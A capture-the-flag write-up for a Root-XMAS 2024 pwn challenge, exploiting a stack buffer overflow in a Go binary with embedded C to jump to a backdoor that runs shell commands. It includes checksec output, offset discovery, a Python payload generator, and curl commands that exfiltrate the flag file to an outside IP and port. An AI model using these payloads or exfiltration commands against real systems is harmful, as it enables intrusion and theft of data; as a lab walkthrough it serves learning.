---
title: Root-XMAS 2024 Day 07 - Go, Pwn, Gown
feed: hide
permalink: /RootXMAS_2024_07
date: 07-12-2024
summary: where bash is harder than pwn.
---
### summary

A "simple" pwn challenge, with a Go binary containing C code. There is a backdoor function allowing to execute a bash command with a variable we control, the challenge being setting the RIP register with the correct address so the backdoor is called. 
However, we have the Docker environment and the binary has no ASLR, so we can extract the backdoor address from the compiled binary.  
### recon

Oh no, a pwn challenge, my nemesis! 
It's been 10 years I told myself I'd tackle this subject, and I didn't jump on the occasion with the recent [Root-me Pwn Month](https://youtu.be/TdQa6QwyovI?si=YvZ7ZwpyhbkJ-pKW). But maybe this one will be an introduction...

Let's check the Go binary. We see it's a a simple web API server , where the `/` endpoint  strips the parameter from null bytes , then set it as an environment variable, then calls the `C.unsafeFunction()`.

```go
func handleRequest(w http.ResponseWriter, r *http.Request) {
	log.Println("Calling handleRequest")
	defer func() {
		log.Println(r.URL.Path)
		gown := r.URL.Query().Get("gown")
		if gown == "" {
			http.Error(w, "Gown parameter is missing", http.StatusBadRequest)
			return
		}

		cGown := C.CString(gown)
		if i := strings.IndexByte(gown, '\x00'); i != -1 {
			gown = gown[:i]
		}
		os.Setenv("GOWN", string(gown))
		fmt.Println("Getenv(GOWN) = ", os.Getenv("GOWN"))
		defer C.free(unsafe.Pointer(cGown))

		C.unsafeFunction(cGown)
		// C.laluBackdoor()
		w.Write([]byte("Request handled\n"))
	}()
}
```

But where is this `unsafeFunction` , I don't see it... ah! it's inserted in the comments of the Go source! That's an original method to mix Go and C.

```c
void unsafeFunction(char *gown) {
    char buffer[64];
    memcpy(buffer, gown, 128); // UTF8 AMIRIGHT ?!
    printf("Received: %s\n", buffer);
}

void laluBackdoor() {
    char *bash_path = "/bin/bash";
    extern char **environ;
    execle(bash_path, bash_path, "-c", "echo $(${GOWN})", NULL, environ);
}
```

We see we have a classic buffer overflow, where we put 128 bytes of user input in a buffer of size 64.
We also see the `laluBackdoor` method conveniently put, never used, but accessible, and executing the content of our user input.
Seems straightforward! Let's compile the binary and check if there are any protections, but the `build.sh` has specific instructions to disable security measures.

```bash
CGO_ENABLED=1 CGO_CFLAGS="-Wstringop-overflow=0 -fno-stack-protector -D_FORTIFY_SOURCE=0" go build -ldflags "-linkmode external -extldflags '-no-pie'" -o gown main.go
```

Let's get the binary directly from our docker container: 
```bash
sudo docker cp 16e6aad445c0:/app/gown ./gown-dock

pwn checksec --file=gown-dock
	Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

As expected, no ASLR, no canary, road is clear!
Even better, the binary is compiled with debug info, so when you launch it, and call the `/` endpoint on your localhost, it segfaults and outputs all the stacktrace, with the content of all ASM registers! Santa just keeps giving gifts!
### solution

Our goal will be to change the Instruction Pointer register (`EIP` in x86, `RIP` in x64), so that instead of pointing to the next instruction it goes straight to `laluBackdoor`. No need for a fancy shell-code creating a reverse shell. 

Let's try to change see which registers we overwrite, by creating a 128 bytes string with a  [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) .

```bash
app ./gown
	2024/12/08 03:29:37 /
	Getenv(GOWN) =  Aa0Aa1Aa2Aa3...Ae1Ae
	Received: Aa0Aa1Aa2Aa3...Ae1Ae
	SIGSEGV: segmentation violation
	...
	rbp    0x3363413263413163 # 3cA2cA1c pattern
	rip    0x64a9f3 # not changed
```

First problem: we overwrite the `RBP` register, but not  `RIP`. What is this trickery?
Thankfully the  [ired-team blog on 64-bit buffer overflow](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow#why-is-rip-not-overflowed) gives us the solution on it's "Why is RIP not overflowed?" section:

> In x64, if `RIP` is assigned a too big value outside of the available memory range (capped at `0x00007FFFFFFFFFFF`) , then the register is left unmodified.

So let's  ~~do aclever or automated analysis of the registries offset~~  Totally guess the offset by trial and error by randomly removing characters from our payload.

```bash
app ./gown
	...
	Received: Aa0Aa1Aa2Aa3...1Ac2Ac3Ac4
	SIGSEGV: segmentation violation
	...
	rbp    0x3363413263413163
	rip    0x346341 # 4cA pattern
```

and after a few tries, it just works! We set the `RIP` pointer with 3 bytes we control. It's offset is at:

```bash
echo -n "Aa0Aa1A...c0Ac1Ac2Ac3Ac4" | wc -c
	75
expr 75 - 3 # 3 bytes reserved for the address
	72
```

Now to find the `laluBackdoor` offset! two possible ways:

- Dynamic analysis with GDB

We can install GDB on the docker container, run the binary and set a break point, to see returned the offset.

```bash
b laluBackdoor
	Breakpoint 1 at 0x61eb95 # !! 4 bytes offset!
```

> [!error] warning
> gdb puts the breakpoint 4 bytes AFTER the real start of the method, which will leave you with a surprise (and lot of time loss ) if you don't know it!

- Static analysis with Ghidra or Objdump.

As we extracted our binary from the docker container, we can analyze it with Ghidra.
Afterwards, searching a more elegant solution for the write up, I just thought about Objdump. No need to start NSA's heavy artillery!

```bash
objdump -d gown-dock | grep "laluBackdoor"
> 	000000000061eb91 <laluBackdoor>:
```

We now have everything to generate our payload that will be comprised of 3 elements:
- A bash `curl` command to exfiltrate the flag, executed by  `laluBackdoor`
- A padding until the 72th character
- The `laluBackdoor` address to overwrite `RIP`

Of course we'd never generate our payload manually, that would be silly, let's create a script automating this right from the start. 
We would do it for the write-up anyway!  (>ᴗ•)


```python
from urllib.parse import quote,unquote
import math

def generate_payload(addr: int, payload: str) -> str:
    offset = 72 # found by testing
	# math for number of bytes in the address
    numBytes = math.ceil(addr.bit_length() / 8)

	# little endian as shown in "pwn checksec"
    encoded_addr = quote(addr.to_bytes(numBytes, 'little')) 
	padding = (offset-len(st))*"#"
	res = quote(payload + padding) + encoded_addr
    return res

x = generate_payload(0x61eb91, "curl -d @//flag/randomflagdockersayspouet.txt 11.111.111.111:49153 #")
print(x)
```

we just have to send it to the pwn chall's instance  and check our [custom python SimpleHTTPServer](https://gist.github.com/LucasParsy/3bc88bb7a7796cb0d5a218c11fa59829) supporting POST requests.

```bash
payload='curl%20-d%20%40//flag/randomflagdockersayspouet.txt%2011.111.111.111%3A49153%20%23%23%23%23%23%91%EBa'

curl -k "dyn-01.xmas.root-me.org:21951/?gown=$payload"

	POST / : b'RM{OffenSkillSaysWhat2024YouGotGowned}'

```

Well done! This chall was not that hard in the end... 
But was it?

### how to lose 5 hours with bash

For whatever reason, during testing, I thought that I had to take care not overwriting the `RAX` register. Surely during my tests with GDB giving a 4 bytes shifted offset. 
So I fixed my offset issue, but carried away this non-existing `RAX` constraint, meaning I had to create payload like this:

```bash
# normal working payload
payloadwithpadding XXXXXX%91%EBa

# payload with useless constraint
payloadwithpadding XXXXXX%01%00%00%00%00%00%00%00%00%00%91%EBa

```

This additional constraint meant my payload maximum size was reduced from **72** chars to **62** . And my `curl` payload was *over* 62 characters...

But thankfully we have multiple solutions to reduce the size of our payload!

##### changing the url

The ip is pretty big, and we use an unusually big port, it takes lots of characters! 
Check out the difference:
```bash
11.111.111.111:49153 # 20 chars
tuxlu.fr             # 8 chars
```

problems:
- There was no DNS on the pwn server (it was fixed the day after, sometimes patience is key)
- I can't open smaller ports on my box, and I'm too cheap to buy a VPS :(

So indeed, had I port 80 opened on my box I would have not spent 5 hours battling with bash! 
(or had I my brain on and found out I was allowed to use 72 chars)

##### writing other bash commands

So, to gain some characters, the file name seems an easy target. look at this long boi: `/flag/randomflagdockersayspouet.txt`
A simple bash expansion like this `"$(cat /flag/*)"` should do the trick...

But that's where appears our worst enemy: the bash trickery that does **parameter expansion**.
Let's check how the bash command with our environment variable is executed:

```c
execle(bash_path, bash_path, "-c", "echo $(${GOWN})", NULL, environ);
```

this  `$(${GOWN})` does some funky stuff. Let's try with ou bash expansion, with a simple `eval` for the expected behavior, then the actual result interpreted by the `laluBackdoor`:

```bash
G2='curl --data-binary "$(cat /flag/*)" 88.165.169.180:49153'
eval $G2
	POST / : b'RM{REDACTED}'
echo $(${G2})
	POST / : b'"$(cat'
```

Indeed, instead of interpreting our bash command, the string is interpreted as is, and it doesn't seem to like spaces inside parenthesis!

OK no problem. We tried for 1 hour or 2 interpreting bash, it doesn't work. But we can do our exploit in two commands: first renaming the file with a smaller name then sending it... right?

```bash
GOWN="cp /flag/randomflagdockersayspouet.txt /tmp/t.txt #"
eval $GOWN
	ok
echo $(${GOWN})
	cp: target '#' is not a directory
```

??!!! This sneaky bash parameter expansion means that all characters in the payload are interpreted either as a command or its parameters! our `#` or `;` are not interpreted as bash commands or command ending instruction.

By pure luck, when we tested the `curl` command, it allows any number of URLs as parameters, and ignores invalid URLs, like this:

```bash
man curl
	curl [OPTIONS] URL...
curl -k example.com "####%91%EBa"
	<title>Example Domain</title>
	...
	curl: (3) URL rejected: No host part in the URL
```

But with `cp`, `mv`, or `dd` executables, we have an usage where the destination is the last character. Where our padding is!

```bash
cp /flag/randomflagdockersayspouet.txt /tmp/flag.txt "####"
	cp: target '####': no file or directory existing
```

after a 5 hours battle, I finally found in the `/bin/` directory of the docker  container a command that would allow me to move my file: good old `tar` !

```bash
tar -cvf /tmp/z.zip /flag/randomflagdockersayspouet.txt #
curl --data-binary @/tmp/z.zip 88.165.169.180:49153 #
	POST / : b'flag/randomflagdockersayspouet.txt\\x00\\x00
	...
	RM{OffenSkillSaysWhat2024YouGotGowned}\\n\\x00\\x00\\x00
```

Why do things the simple way when you can do it the insanely convoluted way?

##### update : null bytes

after the release of this write-up, [iTrooz](https://itrooz.fr/) told me that instead of using a '`#`' to end my payload, I could have used a null-byte '`\x00`'. And indeed yes, I completely forgot about it and it would have perfectly worked. Thanks again for the reminder ^^'


| Previous day | [[Day 06 - Unwrap The Gift]]    |
| ------------ | ------------------------------- |
| Next day     | [[Day 08 - Custom HTTP Server]] |